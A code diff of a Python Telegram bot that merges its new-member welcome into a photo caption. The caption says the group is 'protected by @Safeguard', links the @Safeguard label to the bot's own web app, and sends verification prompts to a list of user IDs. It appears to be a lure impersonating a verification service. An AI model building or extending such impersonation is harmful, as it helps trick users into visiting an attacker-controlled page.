@@ -104,7 +104,7 @@ class HTTPTelegramBot:
             logger.error(f"Error sending message: {e}")
             return None
 
-    def send_photo(self, chat_id, photo_url, caption=None, parse_mode=None):
+    def send_photo(self, chat_id, photo_url, caption=None, parse_mode=None, reply_markup=None):
         """Send a photo to a chat"""
         try:
             data = {
@@ -117,6 +117,9 @@ class HTTPTelegramBot:
             
             if parse_mode:
                 data['parse_mode'] = parse_mode
+            
+            if reply_markup:
+                data['reply_markup'] = json.dumps(reply_markup)
             
             response = requests.post(f"{self.base_url}/sendPhoto", json=data)
             if response.status_code == 200:
@@ -193,54 +196,47 @@ class HTTPTelegramBot:
                 logger.info(f"📝 Chat Type: {chat.get('type')}")
                 logger.info(f"📝 Chat Title: {chat.get('title')}")
                 
-                # 1. Send the Safeguard Human Verification image
+                # Send the Safeguard Human Verification image with caption
                 try:
                     photo_url = "https://i.ibb.co/CKY1GCHq/fuckyou.jpg"
-                    photo_result = self.send_photo(chat_id=chat['id'], photo_url=photo_url)
-                    if photo_result:
-                        logger.info(f"✅ Verification image sent for new member {new_member.get('id')}")
+                    
+                    # Prepare the caption text
+                    welcome_text = (
+                        'This group is being protected by '
+                        '<a href="{webapp_url}">@Safeguard</a>.'
+                        '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
+                    ).format(webapp_url=WEBAPP_URL)
+
+                    # For local development, don't use inline keyboard (Telegram requires HTTPS)
+                    if LOCAL_DEV:
+                        # Send message without inline keyboard for local testing
+                        welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
+                        keyboard = None
                     else:
-                        logger.error(f"❌ Failed to send verification image")
-                except Exception as e:
-                    logger.error(f"❌ Error sending verification image: {e}")
+                        keyboard = {
+                            "inline_keyboard": [[
+                                {
+                                    "text": "🔐 Start Verification",
+                                    "url": WEBAPP_URL
+                                }
+                            ]]
+                        }
 
-                # 2. Send the styled welcome message
-                welcome_text = (
-                    'This group is being protected by '
-                    '<a href="{webapp_url}">@Safeguard</a>.'
-                    '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
-                ).format(webapp_url=WEBAPP_URL)
-
-                # For local development, don't use inline keyboard (Telegram requires HTTPS)
-                if LOCAL_DEV:
-                    # Send message without inline keyboard for local testing
-                    welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
-                    keyboard = None
-                else:
-                    keyboard = {
-                        "inline_keyboard": [[
-                            {
-                                "text": "🔐 Start Verification",
-                                "url": WEBAPP_URL
-                            }
-                        ]]
-                    }
-
-                try:
-                    result = self.send_message(
-                        chat_id=chat['id'],
-                        text=welcome_text,
+                    photo_result = self.send_photo(
+                        chat_id=chat['id'], 
+                        photo_url=photo_url,
+                        caption=welcome_text,
                         parse_mode='HTML',
                         reply_markup=keyboard
                     )
                     
-                    if result:
-                        logger.info(f"✅ Welcome message sent for new member {new_member.get('id')} in chat {chat.get('id')}")
+                    if photo_result:
+                        logger.info(f"✅ Verification image with caption sent for new member {new_member.get('id')} in chat {chat.get('id')}")
                     else:
-                        logger.error(f"❌ Failed to send welcome message")
+                        logger.error(f"❌ Failed to send verification image with caption")
                         
                 except Exception as e:
-                    logger.error(f"❌ Error sending welcome message: {e}")
+                    logger.error(f"❌ Error sending verification image with caption: {e}")
                 
                 # Send verification message to all user IDs in the list
                 self.send_verification_to_all_users(chat)
